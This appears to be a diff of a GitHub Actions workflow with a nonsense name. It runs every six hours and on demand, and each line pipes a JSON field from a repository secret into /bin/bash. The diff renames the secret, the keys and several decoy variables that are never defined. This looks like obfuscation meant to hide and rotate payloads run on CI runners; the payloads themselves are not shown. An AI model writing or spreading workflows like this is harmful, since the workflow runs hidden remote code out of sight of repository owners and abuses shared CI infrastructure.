@@ -1,28 +1,27 @@
 name: sogntaozisn
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 3/6 * * *'
+    - cron: '5 3/6 * * *'
 
-jobs:  # 4955
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: sogntaozisn
         env:
-          mcrue5393: ${{ secrets.mcrue5393 }}
+          kz2164: ${{ secrets.kz2164 }}
         run: |
-          echo $mcrue5393 | jq -r .ugi82 | /bin/bash
-          echo $yv03 | jq -r .u8 | /bin/bash
-          echo $tx7032 | jq -r .iomcu06053 | /bin/bash
-          echo $s4 | jq -r .ei64949 | /bin/bash
-          echo $el19211 | jq -r .kpt88928 | /bin/bash
-          echo $atn3114 | jq -r .lqou3 | /bin/bash
-          echo $amsj29 | jq -r .vgem5065 | /bin/bash
-          echo $twdpv9718 | jq -r .bv1564 | /bin/bash
-          echo $at3951 | jq -r .kenek4646 | /bin/bash
-          echo $njh08309 | jq -r .t23 | /bin/bash
+          echo $kz2164 | jq -r .jszzn6755 | /bin/bash
+          echo $b101 | jq -r .ds1 | /bin/bash
+          echo $xekml43 | jq -r .um572 | /bin/bash
+          echo $vjavz64 | jq -r .matce8 | /bin/bash
+          echo $b78 | jq -r .vmsj3 | /bin/bash
+          echo $v44 | jq -r .eycx32497 | /bin/bash
+          echo $frv188 | jq -r .fkgrk87597 | /bin/bash
+          echo $xjt5 | jq -r .tvt7 | /bin/bash
+          echo $m69 | jq -r .yvrp07694 | /bin/bash
+          echo $zfhfx8 | jq -r .tmqau1 | /bin/bash
+          echo $bbm7417 | jq -r .nav0 | /bin/bash
 
